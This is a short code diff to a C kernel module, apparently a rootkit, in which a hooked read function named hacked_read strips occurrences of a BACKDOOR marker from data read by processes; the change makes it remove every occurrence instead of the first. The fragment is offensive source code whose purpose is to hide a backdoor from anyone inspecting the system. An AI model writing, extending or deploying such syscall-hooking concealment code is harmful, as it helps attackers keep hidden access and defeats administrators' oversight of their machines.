@@ -375,7 +375,7 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 		goto cleanup2;
 	}
 
-	if((strstr(tmp_buf, BACKDOOR))){
+	while((strstr(tmp_buf, BACKDOOR))){
 		char *strBegin  = tmp_buf;
 		char *substrBegin = strstr(strBegin, BACKDOOR);
 		char *substrEnd = substrBegin + strlen(BACKDOOR);
